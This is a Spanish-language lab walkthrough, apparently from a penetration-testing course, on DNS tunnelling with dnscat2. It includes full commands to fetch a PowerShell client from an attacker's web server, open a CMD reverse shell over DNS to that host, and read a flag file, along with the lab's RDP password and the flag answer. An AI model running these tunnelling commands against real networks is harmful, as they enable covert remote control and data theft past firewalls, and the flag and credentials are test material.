
# Túnel DNS con Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) es una herramienta de tunelización que utiliza el protocolo DNS para enviar datos entre dos hosts. Utiliza un canal cifrado `Command-&-Control`( `C&C` o `C2`) y envía datos dentro de registros TXT dentro del protocolo DNS. Por lo general, cada entorno de dominio de directorio activo en una red corporativa tendrá su propio servidor DNS, que resolverá los nombres de host en direcciones IP y enrutará el tráfico a servidores DNS externos que participan en el sistema DNS general. Sin embargo, con dnscat2, la resolución de la dirección se solicita desde un servidor externo. Cuando un servidor DNS local intenta resolver una dirección, los datos se filtran y envían a través de la red en lugar de una solicitud DNS legítima. Dnscat2 puede ser un enfoque extremadamente sigiloso para filtrar datos y al mismo tiempo evadir las detecciones del firewall que eliminan las conexiones HTTPS y rastrean el tráfico. Para nuestro ejemplo de prueba, podemos usar el servidor dnscat2 en nuestro host de ataque y ejecutar el cliente dnscat2 en otro host de Windows.

***

## <mark style="color:purple;">Configuración y uso de dnscat2</mark>

Si `dnscat2` aún no está configurado en nuestro host de ataque, podemos hacerlo usando los siguientes comandos:

### **Clonación de dnscat2 y configuración del servidor**

```shell-session
afsh4ck@kali$ git clone https://github.com/iagox86/dnscat2.git

cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

Luego podemos iniciar el servidor dnscat2 ejecutando el archivo dnscat2.

### **Iniciando el servidor dnscat2**

```shell-session
afsh4ck@kali$ sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

New window created: 0
dnscat2> New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.14.18:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=0ec04a91cd1e963f8c03ca499d589d21 inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=0ec04a91cd1e963f8c03ca499d589d21

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.
```

Después de ejecutar el servidor, nos proporcionará la clave secreta, que tendremos que proporcionar a nuestro cliente dnscat2 en el host de Windows para que pueda autenticar y cifrar los datos que se envían a nuestro servidor dnscat2 externo. Podemos usar el cliente con el proyecto dnscat2 o usar [dnscat2-powershell](https://github.com/lukebaggett/dnscat2-powershell) , un cliente basado en PowerShell compatible con dnscat2 que podemos ejecutar desde destinos Windows para establecer un túnel con nuestro servidor dnscat2. Podemos clonar el proyecto que contiene el archivo del cliente en nuestro host de ataque y luego transferirlo al objetivo.

### **Clonar dnscat2-powershell al host de ataque**

```shell-session
afsh4ck@kali$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

Debemos enviar el archivo `dnscat2.ps1` al objetivo, y una vez importado ejecutar cmd-lets asociados.

### **Importar dnscat2.ps1**

```powershell
PS C:\htb> Import-Module .\dnscat2.ps1
```

Después de importar dnscat2.ps1, podemos usarlo para establecer un túnel con el servidor que se ejecuta en nuestro host de ataque. Podemos enviar una sesión de shell CMD a nuestro servidor.

```powershell
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

Debemos utilizar el secreto precompartido ( `-PreSharedSecret`) generado en el servidor para garantizar que nuestra sesión esté establecida y cifrada. Si todos los pasos se completan con éxito, veremos una sesión establecida con nuestro servidor.

### **Confirmación del establecimiento de la sesión**

```shell-session
New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)

dnscat2>
```

Podemos enumerar las opciones que tenemos con dnscat2 ingresando `?` en el mensaje.

### **Listado de opciones de dnscat2**

```shell-session
dnscat2> ?

Here is a list of commands (use -h on any of them for additional help):
* echo
* help
* kill
* quit
* set
* start
* stop
* tunnels
* unset
* window
* windows
```

Podemos usar dnscat2 para interactuar con sesiones y avanzar más en un entorno objetivo en compromisos. No cubriremos todas las posibilidades con dnscat2 en este módulo, pero se recomienda encarecidamente practicar con él y tal vez incluso encontrar formas creativas de usarlo en un compromiso. Interactúemos con nuestra sesión establecida y entremos en un caparazón.

### **Interactuar con la sesión establecida**

```shell-session
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
exec (OFFICEMANAGER) 1>
```

## <mark style="color:purple;">Caso práctico</mark>

Utilizando los conceptos que se enseñan en esta sección, conéctate al destino y establece un túnel DNS que proporcione una sesión de shell. Envíe el contenido de `C:\Users\htb-student\Documents\flag.txt` como respuesta.

### Ejecutar dnscat2

```shell-session
afsh4ck@kali$ sudo ruby dnscat2.rb --dns host=10.10.15.133,port=53,domain=inlanefreight.local --no-cache

New window created: 0
New window created: crypto-debug
Welcome to dnscat2! Some documentation may be out of date.

auto_attach => false
history_size (for new windows) => 1000
Security policy changed: All connections must be encrypted
New window created: dns1
Starting Dnscat2 DNS server on 10.10.15.133:53
[domains = inlanefreight.local]...

Assuming you have an authoritative DNS server, you can run
the client anywhere with the following (--secret is optional):

  ./dnscat --secret=ff9ab8e75cd8b5247d2dffd6b5a016bf inlanefreight.local

To talk directly to the server without a domain name, run:

  ./dnscat --dns server=x.x.x.x,port=53 --secret=ff9ab8e75cd8b5247d2dffd6b5a016bf

Of course, you have to figure out <server> yourself! Clients
will connect directly on UDP port 53.

dnscat2>
```

### Clonamos **dnscat2-powershell al host de ataque**

```shell-session
afsh4ck@kali$ git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

### Conexión por RDP al equipo de pivoting

```
xfreerdp /v:10.129.238.90 /u:htb-student /p:'HTB_@cademy_stdnt!'
```

<figure><img src="/files/BRhwzWN2cLDPSrndLm7e" alt=""><figcaption></figcaption></figure>

### Enviamos **dnscat2.ps1**

#### En nuestro equipo de atacante:

```shell-session
afsh4ck@kali$ ls
dnscat2.ps1  README.md

afsh4ck@kali$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### En el equipo de pivoting

{% code overflow="wrap" %}

```powershell
Invoke-WebRequest -Uri 'http://10.10.15.133:80/dnscat2.ps1' -OutFile 'dnscat2.ps1'
```

{% endcode %}

<figure><img src="/files/FWvyhEGKFTpoOVEbkcox" alt=""><figcaption></figcaption></figure>

### Importar dnscat2.ps1

```powershell
PS C:\Users\htb-student\Desktop> Import-Module .\dnscat2.ps1 
```

### Establecer tunel con Shell CMD

```powershell
PS C:\Users\htb-student\Desktop> Start-Dnscat2 -DNSserver 10.10.15.133 -Domain inlanefreight.local -PreSharedSecret ff9ab8e75cd8b5247d2dffd6b5a016bf -Exec cmd
```

<figure><img src="/files/2sne85729TjV5e5jlDdA" alt=""><figcaption></figcaption></figure>

### Recibimos la shell en nuestro equipo atacante

```
dnscat2> New window created: 1
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
dnscat2>
```

### Interactuar con la shell

```
dnscat2> window -i 1
New window created: 1
history_size (session) => 1000
Session 1 Security: ENCRYPTED AND VERIFIED!
(the security depends on the strength of your pre-shared secret!)
This is a console session!

That means that anything you type will be sent as-is to the
client, and anything they type will be displayed as-is on the
screen! If the client is executing a command and you don't
see a prompt, try typing 'pwd' or something!

To go back, type ctrl-z.

Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>
exec (OFFICEMANAGER) 1>
```

En este punto vamos a buscar la flag en la carpeta /Documents:

```powershell
exec (OFFICEMANAGER) 1> dir
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\Users\htb-student

06/05/2024  03:02 PM    <DIR>          .
06/05/2024  03:02 PM    <DIR>          ..
02/22/2022  03:28 PM    <DIR>          3D Objects
02/22/2022  03:28 PM    <DIR>          Contacts
06/05/2024  03:06 PM    <DIR>          Desktop
06/05/2024  03:02 PM           410,495 dnscat2.ps1
05/03/2022  07:42 AM    <DIR>          Documents
05/13/2022  08:06 AM    <DIR>          Downloads
02/22/2022  03:28 PM    <DIR>          Favorites
02/22/2022  03:28 PM    <DIR>          Links
02/22/2022  03:28 PM    <DIR>          Music
04/26/2022  12:05 PM    <DIR>          OneDrive
02/22/2022  03:29 PM    <DIR>          Pictures
02/22/2022  03:28 PM    <DIR>          Saved Games
02/22/2022  03:28 PM    <DIR>          Searches
04/26/2022  08:24 PM    <DIR>          Videos
               1 File(s)        410,495 bytes
              15 Dir(s)  12,661,350,400 bytes free
              
exec (OFFICEMANAGER) 1> cd Documents

C:\Users\htb-student\Documents> dir
Directory of C:\Users\htb-student\Documents

05/03/2022  07:42 AM    <DIR>          .
05/03/2022  07:42 AM    <DIR>          ..
05/03/2022  07:42 AM                15 flag.txt
               1 File(s)             15 bytes
               2 Dir(s)  12,661,170,176 bytes free
               
C:\Users\htb-student\Documents> type flag.txt
AC@tinth3Tunnel
```

Y obtenemos la flag correctamente! 🏆
